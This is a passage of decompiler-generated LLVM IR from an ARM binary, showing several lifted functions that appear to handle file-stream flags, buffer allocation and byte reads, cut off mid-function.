  %v1_14908 = and i32 %v0_14908, 131072
  store i32 %v1_14908, i32* %r3.global-to-local, align 4
  %v2_1490c = or i32 %v1_14908, %v0_1490c
  store i32 %v2_1490c, i32* @r4, align 4
  br label %dec_label_pc_14938

dec_label_pc_14914:                               ; preds = %dec_label_pc_148bc
  %v7_14914 = icmp eq i32 %v0_14914, -1
  %v0_14920.pre = load i32, i32* @r4, align 4
  br i1 %v7_14914, label %dec_label_pc_14914._crit_edge, label %bb36

bb36:                                             ; preds = %dec_label_pc_14914
  %v2_14918 = or i32 %v0_14920.pre, ptrtoint (i32* @global_var_20000.515 to i32)
  store i32 %v2_14918, i32* @r4, align 4
  br label %dec_label_pc_14914._crit_edge

dec_label_pc_14914._crit_edge:                    ; preds = %dec_label_pc_14914, %bb36
  %v0_14920 = phi i32 [ %v2_14918, %bb36 ], [ %v0_14920.pre, %dec_label_pc_14914 ]
  %v0_1491c = load i32, i32* @r6, align 4
  store i32 %v0_1491c, i32* %r0.global-to-local, align 4
  store i32 %v0_14920, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_14928 = call i32 @function_109e4(i32 %v0_1491c, i32 %v0_14920)
  store i32 %v2_14928, i32* %r0.global-to-local, align 4
  %v1_1492c = icmp slt i32 %v2_14928, 0
  %v1_14930 = load i32, i32* @sb, align 4
  %v2_14930 = add i32 %v1_14930, 4
  %v3_14930 = inttoptr i32 %v2_14930 to i32*
  store i32 %v2_14928, i32* %v3_14930, align 4
  br i1 %v1_1492c, label %dec_label_pc_14850, label %.dec_label_pc_14938_crit_edge

.dec_label_pc_14938_crit_edge:                    ; preds = %dec_label_pc_14914._crit_edge
  %v0_1493c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14938

dec_label_pc_14938:                               ; preds = %.dec_label_pc_14938_crit_edge, %dec_label_pc_14908
  %v0_14954 = phi i32 [ %v0_1493c.pre, %.dec_label_pc_14938_crit_edge ], [ %v2_1490c, %dec_label_pc_14908 ]
  %v0_14938 = load i32, i32* @sb, align 4
  %v1_14938 = inttoptr i32 %v0_14938 to i16*
  %v2_14938 = load i16, i16* %v1_14938, align 2
  %v3_14938 = zext i16 %v2_14938 to i32
  %v1_1493c = urem i32 %v0_14954, 4
  %v1_14940 = and i32 %v0_14954, 1024
  %v1_14944 = and i32 %v3_14938, 8192
  %v1_14948 = add nuw nsw i32 %v1_1493c, 1
  %v2_1494c = or i32 %v1_14944, %v1_14940
  store i32 %v2_1494c, i32* %r3.global-to-local, align 4
  %v1_14950 = xor i32 %v1_14948, 3
  store i32 %v1_14950, i32* %r1.global-to-local, align 4
  %v1_14954 = and i32 %v0_14954, ptrtoint (i32* @global_var_20000.515 to i32)
  store i32 %v1_14954, i32* %r2.global-to-local, align 4
  %v2_14954 = icmp eq i32 %v1_14954, 0
  %v1_14958 = add i32 %v0_14938, 4
  %v2_14958 = inttoptr i32 %v1_14958 to i32*
  %v3_14958 = load i32, i32* %v2_14958, align 4
  store i32 %v3_14958, i32* @r5, align 4
  br i1 %v2_14954, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_14938
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_14938, %bb37
  %v0_14964 = phi i32 [ 0, %dec_label_pc_14938 ], [ 32768, %bb37 ]
  %v4_14960 = mul nuw nsw i32 %v1_14950, 16
  %v5_14960 = or i32 %v2_1494c, %v4_14960
  store i32 %v5_14960, i32* %r3.global-to-local, align 4
  %v2_14964 = or i32 %v0_14964, %v5_14960
  store i32 %v2_14964, i32* %r2.global-to-local, align 4
  %v8_14968 = icmp eq i32 %v3_14958, 2147483647
  %v1_1496c = trunc i32 %v2_14964 to i16
  store i16 %v1_1496c, i16* %v1_14938, align 2
  br i1 %v8_14968, label %dec_label_pc_1499c, label %dec_label_pc_14974

dec_label_pc_14974:                               ; preds = %bb38
  %v0_14974 = call i32 @function_11200()
  store i32 %v0_14974, i32* @r4, align 4
  %v0_1497c = load i32, i32* @r5, align 4
  store i32 %v0_1497c, i32* @r0, align 4
  %v1_14980 = inttoptr i32 %v0_14974 to i32*
  %v2_14980 = load i32, i32* %v1_14980, align 4
  store i32 %v2_14980, i32* @r5, align 4
  %v1_14984 = call i32 @function_15b6c(i32 %v0_1497c)
  store i32 %v1_14984, i32* %r0.global-to-local, align 4
  %v2_14988 = icmp eq i32 %v1_14984, 0
  br i1 %v2_14988, label %.thread5, label %bb39

bb39:                                             ; preds = %dec_label_pc_14974
  %v1_1498c = load i32, i32* @sb, align 4
  %v2_1498c = inttoptr i32 %v1_1498c to i16*
  %v3_1498c = load i16, i16* %v2_1498c, align 2
  %v4_1498c = zext i16 %v3_1498c to i32
  %v2_14990 = or i32 %v4_1498c, 256
  store i32 %v2_14990, i32* %r3.global-to-local, align 4
  %v2_14994 = trunc i32 %v2_14990 to i16
  store i16 %v2_14994, i16* %v2_1498c, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_14974, %bb39
  %v0_14998 = load i32, i32* @r5, align 4
  %v1_14998 = load i32, i32* @r4, align 4
  %v2_14998 = inttoptr i32 %v1_14998 to i32*
  store i32 %v0_14998, i32* %v2_14998, align 4
  br label %dec_label_pc_1499c

dec_label_pc_1499c:                               ; preds = %bb38, %.thread5
  %v0_1499c = load i32, i32* @sb, align 4
  %v1_1499c = add i32 %v0_1499c, 8
  %v2_1499c = inttoptr i32 %v1_1499c to i32*
  %v3_1499c = load i32, i32* %v2_1499c, align 4
  store i32 %v3_1499c, i32* %r3.global-to-local, align 4
  %v2_149a0 = icmp eq i32 %v3_1499c, 0
  br i1 %v2_149a0, label %dec_label_pc_149a8, label %bb40

dec_label_pc_149a8:                               ; preds = %dec_label_pc_1499c
  store i32 4096, i32* @r0, align 4
  %v0_149ac = call i32 @function_1182c()
  store i32 %v0_149ac, i32* %r0.global-to-local, align 4
  %v2_149b0 = icmp eq i32 %v0_149ac, 0
  %v1_149c0.pre = load i32, i32* @sb, align 4
  br i1 %v2_149b0, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_149a8
  %v2_149b4 = inttoptr i32 %v1_149c0.pre to i16*
  %v3_149b4 = load i16, i16* %v2_149b4, align 2
  %v4_149b4 = zext i16 %v3_149b4 to i32
  %v2_149b8 = add i32 %v0_149ac, 4096
  store i32 %v2_149b8, i32* %r2.global-to-local, align 4
  %v2_149bc = or i32 %v4_149b4, 16384
  store i32 %v2_149bc, i32* %r3.global-to-local, align 4
  %v2_149c0 = add i32 %v1_149c0.pre, 8
  %v3_149c0 = inttoptr i32 %v2_149c0 to i32*
  store i32 %v0_149ac, i32* %v3_149c0, align 4
  %v1_149c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_149c4 = load i32, i32* @sb, align 4
  %v3_149c4 = add i32 %v2_149c4, 12
  %v4_149c4 = inttoptr i32 %v3_149c4 to i32*
  store i32 %v1_149c4, i32* %v4_149c4, align 4
  %v1_149c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_149c8 = trunc i32 %v1_149c8 to i16
  %v3_149c8 = load i32, i32* @sb, align 4
  %v4_149c8 = inttoptr i32 %v3_149c8 to i16*
  store i16 %v2_149c8, i16* %v4_149c8, align 2
  br label %bb40

.thread9:                                         ; preds = %dec_label_pc_149a8
  %v2_149c019 = add i32 %v1_149c0.pre, 8
  %v3_149c020 = inttoptr i32 %v2_149c019 to i32*
  store i32 0, i32* %v3_149c020, align 4
  %v2_149cc = load i32, i32* @sb, align 4
  %v3_149cc = add i32 %v2_149cc, 12
  %v4_149cc = inttoptr i32 %v3_149cc to i32*
  store i32 0, i32* %v4_149cc, align 4
  br label %bb40

bb40:                                             ; preds = %.thread8, %dec_label_pc_1499c, %.thread9
  store i32 56, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_149d8 = load i32, i32* @fp, align 4
  %v2_149d8 = add i32 %v0_149d8, 56
  %v3_149d8 = inttoptr i32 %v2_149d8 to i32*
  %v4_149d8 = load i32, i32* %v3_149d8, align 4
  store i32 %v4_149d8, i32* %r3.global-to-local, align 4
  %v2_149dc = load i32, i32* @sb, align 4
  %v3_149dc = add i32 %v2_149dc, 2
  %v4_149dc = inttoptr i32 %v3_149dc to i8*
  store i8 0, i8* %v4_149dc, align 1
  %v0_149e0 = load i32, i32* @sb, align 4
  %v1_149e0 = inttoptr i32 %v0_149e0 to i16*
  %v2_149e0 = load i16, i16* %v1_149e0, align 2
  %v3_149e0 = zext i16 %v2_149e0 to i32
  store i32 %v3_149e0, i32* %r2.global-to-local, align 4
  %v0_149e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_149e4 = inttoptr i32 %v0_149e4 to i32*
  %v2_149e4 = load i32, i32* %v1_149e4, align 4
  store i32 %v2_149e4, i32* %r1.global-to-local, align 4
  %v1_149e8 = add i32 %v0_149e0, 8
  %v2_149e8 = inttoptr i32 %v1_149e8 to i32*
  %v3_149e8 = load i32, i32* %v2_149e8, align 4
  store i32 %v3_149e8, i32* %r3.global-to-local, align 4
  %v1_149ec = and i32 %v3_149e0, 8192
  %v2_149ec = icmp eq i32 %v1_149ec, 0
  %v2_149f0 = add i32 %v0_149e0, 20
  %v3_149f0 = inttoptr i32 %v2_149f0 to i32*
  store i32 %v3_149e8, i32* %v3_149f0, align 4
  %v0_149f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_149f4 = load i32, i32* @sb, align 4
  %v2_149f4 = add i32 %v1_149f4, 44
  %v3_149f4 = inttoptr i32 %v2_149f4 to i32*
  store i32 %v0_149f4, i32* %v3_149f4, align 4
  %v0_149f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_149f8 = load i32, i32* @sb, align 4
  %v2_149f8 = add i32 %v1_149f8, 52
  %v3_149f8 = inttoptr i32 %v2_149f8 to i32*
  store i32 %v0_149f8, i32* %v3_149f8, align 4
  %v0_149fc = load i32, i32* %r3.global-to-local, align 4
  %v1_149fc = load i32, i32* @sb, align 4
  %v2_149fc = add i32 %v1_149fc, 24
  %v3_149fc = inttoptr i32 %v2_149fc to i32*
  store i32 %v0_149fc, i32* %v3_149fc, align 4
  %v0_14a00 = load i32, i32* %r3.global-to-local, align 4
  %v1_14a00 = load i32, i32* @sb, align 4
  %v2_14a00 = add i32 %v1_14a00, 28
  %v3_14a00 = inttoptr i32 %v2_14a00 to i32*
  store i32 %v0_14a00, i32* %v3_14a00, align 4
  %v0_14a04 = load i32, i32* %r3.global-to-local, align 4
  %v1_14a04 = load i32, i32* @sb, align 4
  %v2_14a04 = add i32 %v1_14a04, 16
  %v3_14a04 = inttoptr i32 %v2_14a04 to i32*
  store i32 %v0_14a04, i32* %v3_14a04, align 4
  br i1 %v2_149ec, label %dec_label_pc_14ac0, label %dec_label_pc_14a0c

dec_label_pc_14a0c:                               ; preds = %bb40
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_14a10 = load i32, i32* @fp, align 4
  %v2_14a10 = add i32 %v0_14a10, 36
  %v3_14a10 = inttoptr i32 %v2_14a10 to i32*
  %v4_14a10 = load i32, i32* %v3_14a10, align 4
  store i32 %v4_14a10, i32* %r8.global-to-local, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_14a18 = add i32 %v0_14a10, 108
  %v3_14a18 = inttoptr i32 %v2_14a18 to i32*
  %v4_14a18 = load i32, i32* %v3_14a18, align 4
  store i32 %v4_14a18, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_14a20 = ptrtoint i32* %stack_var_-56 to i32
  %v2_14a24 = add i32 %v0_14a10, 72
  %v3_14a24 = inttoptr i32 %v2_14a24 to i32*
  %v4_14a24 = load i32, i32* %v3_14a24, align 4
  store i32 %v4_14a10, i32* %r1.global-to-local, align 4
  store i32 %v4_14a18, i32* %r2.global-to-local, align 4
  store i32 %v2_14a20, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14a24)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_14a40 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14a40, i32* %r0.global-to-local, align 4
  %v0_14a44 = load i32, i32* @fp, align 4
  %v2_14a44 = add i32 %v0_14a44, 16
  %v3_14a44 = inttoptr i32 %v2_14a44 to i32*
  %v4_14a44 = load i32, i32* %v3_14a44, align 4
  call void @__pseudo_branch(i32 %v4_14a44)
  store i32 96, i32* %r3.global-to-local, align 4
  %v0_14a54 = load i32, i32* @fp, align 4
  %v2_14a54 = add i32 %v0_14a54, 96
  %v3_14a54 = inttoptr i32 %v2_14a54 to i32*
  %v4_14a54 = load i32, i32* %v3_14a54, align 4
  store i32 %v4_14a54, i32* %r4.global-to-local, align 4
  %v0_14a58 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_14a58, i32* %r1.global-to-local, align 4
  store i32 %v4_14a54, i32* %r2.global-to-local, align 4
  store i32 %v2_14810, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14a24)
  store i32 %v4_14a54, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14a44)
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_14a7c = load i32, i32* @fp, align 4
  %v2_14a7c = add i32 %v0_14a7c, 44
  %v3_14a7c = inttoptr i32 %v2_14a7c to i32*
  %v4_14a7c = load i32, i32* %v3_14a7c, align 4
  store i32 %v4_14a7c, i32* @ip, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v1_14a84 = inttoptr i32 %v4_14a7c to i32*
  %v2_14a84 = load i32, i32* %v1_14a84, align 4
  store i32 %v2_14a84, i32* %r2.global-to-local, align 4
  store i32 %v2_14810, i32* %r0.global-to-local, align 4
  %v1_14a8c = load i32, i32* @sb, align 4
  %v2_14a8c = add i32 %v1_14a8c, 32
  %v3_14a8c = inttoptr i32 %v2_14a8c to i32*
  store i32 %v2_14a84, i32* %v3_14a8c, align 4
  %v0_14a90 = load i32, i32* @fp, align 4
  %v1_14a90 = load i32, i32* %r3.global-to-local, align 4
  %v2_14a90 = add i32 %v1_14a90, %v0_14a90
  %v3_14a90 = inttoptr i32 %v2_14a90 to i32*
  %v4_14a90 = load i32, i32* %v3_14a90, align 4
  store i32 %v4_14a90, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_14a98 = load i32, i32* @sb, align 4
  %v1_14a98 = load i32, i32* @ip, align 4
  %v2_14a98 = inttoptr i32 %v1_14a98 to i32*
  store i32 %v0_14a98, i32* %v2_14a98, align 4
  call void @__pseudo_branch(i32 %v4_14a90)
  store i32 %v2_14a20, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14a90)
  br label %dec_label_pc_14ac0

dec_label_pc_14abc:                               ; preds = %dec_label_pc_14850, %dec_label_pc_1483c, %dec_label_pc_1485c
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_14ac0

dec_label_pc_14ac0:                               ; preds = %bb40, %dec_label_pc_14894, %dec_label_pc_14a0c, %dec_label_pc_14abc
  %v0_14ac0 = load i32, i32* @sb, align 4
  store i32 %v0_14ac0, i32* %r0.global-to-local, align 4
  %v2_14ac8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14ac8, i32* %r4.global-to-local, align 4
  store i32 %v6_147fc, i32* @r5, align 4
  store i32 %v9_147fc, i32* @r6, align 4
  store i32 %v18_147fc, i32* @sb, align 4
  store i32 %v24_147fc, i32* @fp, align 4
  ret i32 %v0_14ac0

; uselistorder directives
  uselistorder i32 %v1_149c0.pre, { 2, 1, 0 }
  uselistorder i32 %v0_14954, { 1, 2, 0 }
  uselistorder i32 %v0_14920, { 1, 0 }
  uselistorder i32 %v1_148e4, { 1, 0 }
  uselistorder i32 %v0_148e4, { 1, 0 }
  uselistorder i32 %v1_148cc, { 1, 0, 2 }
  uselistorder i32 %v1_14884, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 26, 24, 25 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 5, 4, 6, 7, 8, 9, 10, 18, 12, 11, 14, 13, 0, 15, 16, 17 }
  uselistorder i32 16384, { 50, 0, 51, 38, 68, 39, 69, 40, 70, 41, 71, 42, 72, 43, 73, 18, 74, 17, 62, 3, 52, 36, 53, 4, 54, 37, 55, 5, 56, 6, 57, 7, 58, 8, 59, 9, 60, 10, 61, 35, 63, 11, 64, 12, 65, 13, 66, 14, 67, 44, 75, 15, 76, 16, 77, 21, 78, 20, 79, 46, 80, 47, 81, 19, 82, 45, 83, 84, 22, 85, 23, 86, 24, 87, 48, 88, 25, 1, 26, 89, 27, 90, 29, 91, 28, 92, 31, 93, 30, 94, 49, 95, 32, 2, 33, 96, 34, 97 }
  uselistorder i32 4096, { 8, 9, 10, 1, 0, 2, 17, 3, 11, 4, 12, 13, 6, 14, 5, 7, 15, 16 }
  uselistorder i32 32768, { 1, 4, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @function_109e4, { 1, 0, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32)* @function_10c0c, { 5, 0, 14, 11, 10, 13, 12, 9, 8, 7, 6, 4, 3, 2, 1 }
  uselistorder i32 1024, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 ()* @function_1182c, { 9, 8, 46, 5, 0, 4, 1, 2, 3, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 7, 6 }
  uselistorder i32 80, { 5, 2, 3, 4, 0, 1, 6 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @function_12898, { 7, 6, 5, 4, 0, 3, 1, 2, 10, 9, 8 }
  uselistorder i32* @fp, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 101, 89, 90, 91, 92, 93, 95, 94, 96, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 65, 63, 64, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 83, 81, 82, 84, 85, 86, 87, 88, 97, 98, 99, 100, 48, 49, 50, 51 }
  uselistorder i32* @sb, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 125, 106, 107, 108, 109, 110, 111, 112, 113, 114, 117, 115, 116, 118, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 48, 46, 47, 1, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 119, 120, 121, 122, 123, 124, 59, 60, 61, 62 }
  uselistorder label %dec_label_pc_14ac0, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_14abc, { 2, 0, 1 }
  uselistorder label %bb40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1499c, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_14914._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_148bc, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1486c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1483c, { 1, 2, 0 }
}

define i32 @function_14ad4(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14ad4:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v0_14ad4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14ad4, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_14ad4
  %v1_14adc = load i32, i32* %r2.global-to-local, align 4
  %v2_14adc = load i32, i32* %r3.global-to-local, align 4
  %v3_14adc = and i32 %v2_14adc, %v1_14adc
  %v2_14ae0 = trunc i32 %v3_14adc to i16
  %v4_14ae0 = inttoptr i32 %v3_14adc to i16*
  store i16 %v2_14ae0, i16* %v4_14ae0, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_14ad4, %bb
  %v0_14b08 = call i32 @function_11200()
  store i32 %v0_14b08, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_14b14 = inttoptr i32 %v0_14b08 to i32*
  %v2_14b14 = load i32, i32* %v1_14b14, align 4
  store i32 %v2_14b14, i32* @r6, align 4
  %v1_14b18 = call i32 @function_15b6c(i32 0)
  %v2_14b20 = icmp eq i32 %v1_14b18, 0
  store i32 124804, i32* @r4, align 4
  br i1 %v2_14b20, label %bb23, label %.thread13

bb23:                                             ; preds = %.thread10
  store i32 304, i32* %r2.global-to-local, align 4
  %v5_14b2c = load i16, i16* inttoptr (i32 125108 to i16*), align 4
  %v7_14b2c = zext i16 %v5_14b2c to i32
  %v2_14b30 = xor i32 %v7_14b2c, 256
  store i32 %v2_14b30, i32* @r3, align 4
  %v2_14b34 = trunc i32 %v2_14b30 to i16
  store i16 %v2_14b34, i16* inttoptr (i32 125108 to i16*), align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread10, %bb23
  store i32 1, i32* @r0, align 4
  %v1_14b3c = call i32 @function_15b6c(i32 1)
  %v2_14b40 = icmp eq i32 %v1_14b3c, 0
  br i1 %v2_14b40, label %bb24, label %.thread17

bb24:                                             ; preds = %.thread13
  %v1_14b48 = load i32, i32* @r4, align 4
  %v3_14b48 = add i32 %v1_14b48, 304
  store i32 %v3_14b48, i32* %r2.global-to-local, align 4
  %v2_14b4c = add i32 %v1_14b48, 384
  %v3_14b4c = inttoptr i32 %v2_14b4c to i16*
  %v4_14b4c = load i16, i16* %v3_14b4c, align 2
  %v5_14b4c = zext i16 %v4_14b4c to i32
  %v2_14b50 = xor i32 %v5_14b4c, 256
  store i32 %v2_14b50, i32* %r3.global-to-local, align 4
  %v2_14b54 = trunc i32 %v2_14b50 to i16
  store i16 %v2_14b54, i16* %v3_14b4c, align 2
  br label %.thread17

.thread17:                                        ; preds = %.thread13, %bb24
  %v0_14b58 = load i32, i32* @r6, align 4
  %v1_14b58 = load i32, i32* @r5, align 4
  %v2_14b58 = inttoptr i32 %v1_14b58 to i32*
  store i32 %v0_14b58, i32* %v2_14b58, align 4
  ret i32 %v1_14b3c

; uselistorder directives
  uselistorder i32 %v3_14adc, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32)* @function_15b6c, { 2, 1, 0 }
  uselistorder label %.thread17, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_14b6c(i32 %arg1) local_unnamed_addr {
dec_label_pc_14b6c:
  store i32 124804, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1675c.530 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_14b88 = call i32 @function_11300()
  ret i32 %v0_14b88
}

define i32 @function_14c74(i32 %arg1) local_unnamed_addr {
dec_label_pc_14c74:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14c74 = load i32, i32* @r4, align 4
  store i32 %v3_14c74, i32* %stack_var_-8, align 4
  %v1_14c78 = add i32 %arg1, 8
  %v2_14c78 = inttoptr i32 %v1_14c78 to i32*
  %v3_14c78 = load i32, i32* %v2_14c78, align 4
  %v1_14c7c = add i32 %arg1, 16
  %v2_14c7c = inttoptr i32 %v1_14c7c to i32*
  %v3_14c7c = load i32, i32* %v2_14c7c, align 4
  %v9_14c80 = icmp eq i32 %v3_14c7c, %v3_14c78
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_14c80, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_14c74
  store i32 %v3_14c78, i32* %v2_14c7c, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_14c74, %bb
  %v1_14c8c = xor i1 %v9_14c80, true
  call void @__pseudo_cond_branch(i1 %v1_14c8c, i32 ptrtoint (i32* @global_var_15f58.531 to i32))
  %v0_14c90 = load i32, i32* %r4.global-to-local, align 4
  %v1_14c90 = add i32 %v0_14c90, 8
  %v2_14c90 = inttoptr i32 %v1_14c90 to i32*
  %v3_14c90 = load i32, i32* %v2_14c90, align 4
  %v1_14c94 = add i32 %v0_14c90, 16
  %v2_14c94 = inttoptr i32 %v1_14c94 to i32*
  %v3_14c94 = load i32, i32* %v2_14c94, align 4
  %v2_14c98 = sub i32 %v3_14c94, %v3_14c90
  %v2_14c9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14c9c, i32* @r4, align 4
  ret i32 %v2_14c98

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_14ca4(i32 %arg1) local_unnamed_addr {
dec_label_pc_14ca4:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14ca4 = load i32, i32* @r4, align 4
  store i32 %v3_14ca4, i32* %stack_var_-16, align 4
  %v6_14ca4 = load i32, i32* @r5, align 4
  %v12_14ca4 = load i32, i32* @lr, align 4
  %v1_14ca8 = add i32 %arg1, 52
  %v2_14ca8 = inttoptr i32 %v1_14ca8 to i32*
  %v3_14ca8 = load i32, i32* %v2_14ca8, align 4
  %v2_14cb0 = icmp eq i32 %v3_14ca8, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 124804, i32* %r6.global-to-local, align 4
  br i1 %v2_14cb0, label %dec_label_pc_14ce8, label %dec_label_pc_14cc4

dec_label_pc_14cc4:                               ; preds = %dec_label_pc_14ca4
  %v1_14cc4 = add i32 %arg1, 16
  %v2_14cc4 = inttoptr i32 %v1_14cc4 to i32*
  %v3_14cc4 = load i32, i32* %v2_14cc4, align 4
  %v1_14cc8 = add i32 %arg1, 24
  %v2_14cc8 = inttoptr i32 %v1_14cc8 to i32*
  %v3_14cc8 = load i32, i32* %v2_14cc8, align 4
  %v3_14ccc = icmp ult i32 %v3_14cc4, %v3_14cc8
  br i1 %v3_14ccc, label %.thread, label %dec_label_pc_14cdc

.thread:                                          ; preds = %dec_label_pc_14cc4
  %v2_14cd0 = inttoptr i32 %v3_14cc4 to i8*
  %v3_14cd0 = load i8, i8* %v2_14cd0, align 1
  %v4_14cd0 = zext i8 %v3_14cd0 to i32
  store i32 %v4_14cd0, i32* %r4.global-to-local, align 4
  %v6_14cd0 = add i32 %v3_14cc4, 1
  store i32 %v6_14cd0, i32* %v2_14cc4, align 4
  br label %dec_label_pc_14d5c

dec_label_pc_14cdc:                               ; preds = %dec_label_pc_14cc4
  %v1_14cdc = inttoptr i32 %arg1 to i16*
  %v2_14cdc = call i32 @function_151d0(i16* %v1_14cdc)
  store i32 %v2_14cdc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14d5c

dec_label_pc_14ce8:                               ; preds = %dec_label_pc_14ca4
  %v1_14cec = add i32 %arg1, 56
  store i32 %v1_14cec, i32* @r4, align 4
  %v4_14d00 = load i32, i32* inttoptr (i32 124876 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14d00)
  %v0_14d14 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d14 = add i32 %v0_14d14, 16
  %v3_14d14 = inttoptr i32 %v2_14d14 to i32*
  %v4_14d14 = load i32, i32* %v3_14d14, align 4
  store i32 85280, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14d14)
  %v0_14d20 = load i32, i32* @r5, align 4
  %v1_14d20 = add i32 %v0_14d20, 16
  %v2_14d20 = inttoptr i32 %v1_14d20 to i32*
  %v3_14d20 = load i32, i32* %v2_14d20, align 4
  %v1_14d24 = add i32 %v0_14d20, 24
  %v2_14d24 = inttoptr i32 %v1_14d24 to i32*
  %v3_14d24 = load i32, i32* %v2_14d24, align 4
  %v3_14d28 = icmp ult i32 %v3_14d20, %v3_14d24
  br i1 %v3_14d28, label %.thread2, label %dec_label_pc_14d38

.thread2:                                         ; preds = %dec_label_pc_14ce8
  %v2_14d2c = inttoptr i32 %v3_14d20 to i8*
  %v3_14d2c = load i8, i8* %v2_14d2c, align 1
  %v4_14d2c = zext i8 %v3_14d2c to i32
  store i32 %v4_14d2c, i32* %r4.global-to-local, align 4
  %v6_14d2c = add i32 %v3_14d20, 1
  store i32 %v6_14d2c, i32* %v2_14d20, align 4
  br label %dec_label_pc_14d44

dec_label_pc_14d38:                               ; preds = %dec_label_pc_14ce8
  %v1_14d3c = inttoptr i32 %v0_14d20 to i16*
  %v2_14d3c = call i32 @function_151d0(i16* %v1_14d3c)
  store i32 %v2_14d3c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14d44

dec_label_pc_14d44:                               ; preds = %.thread2, %dec_label_pc_14d38
